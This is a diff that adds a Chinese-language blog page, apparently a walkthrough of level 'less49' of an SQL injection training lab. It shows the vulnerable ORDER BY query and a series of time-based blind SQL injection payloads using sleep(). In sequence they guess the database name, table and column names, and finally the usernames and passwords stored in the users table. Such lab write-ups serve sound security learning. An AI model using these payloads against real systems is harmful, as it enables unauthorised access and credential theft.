@@ -1,0 +1,29 @@
+<hr>
+<h2 id="title-less49url-https-www-yuque-com-u29002979-ep2zrx-oz4wh5948tg1ih7y"><a href="#title-less49url-https-www-yuque-com-u29002979-ep2zrx-oz4wh5948tg1ih7y" class="headerlink" title="title: less49url: https://www.yuque.com/u29002979/ep2zrx/oz4wh5948tg1ih7y"></a>title: less49<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/oz4wh5948tg1ih7y">https://www.yuque.com/u29002979/ep2zrx/oz4wh5948tg1ih7y</a></h2><pre><code class="bash">$id=$_GET[&#39;sort&#39;];	
+
+$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
+</code></pre>
+<p>此关的闭合方式为单引号’，还是需要时间盲注去猜解数据\ <a name="qjWYr"></a></p>
+<h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1&#39;</code> <a name="ukBAB"></a></p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre><code class="bash">拆解数据库名称长度
+?sort=1&#39; and if(length(database())=8,sleep(3),0)--+
+
+猜解数据库名称 
+?sort=1&#39; and if(ascii(mid(database(),1,1))&lt;=135,sleep(3),0)--+
+
+猜解数据表名称长度
+?sort=1&#39; and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+
+
+猜解数据表名称
+?sort=1&#39; and if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#39;e&#39;,sleep(3),0)--+
+
+
+猜解字段名称长度
+?sort=1&#39; and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))=20,sleep(3),0)#
+
+猜解字段名称
+?sort=1&#39; and if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1)=&#39;i&#39;,sleep(3),0)--+
+
+猜解字段内容
+?sort=1&#39; and if(mid((select group_concat(username,0x7e,password) from users),1,1)=&#39;D&#39;,sleep(3),0)--+
+</code></pre>
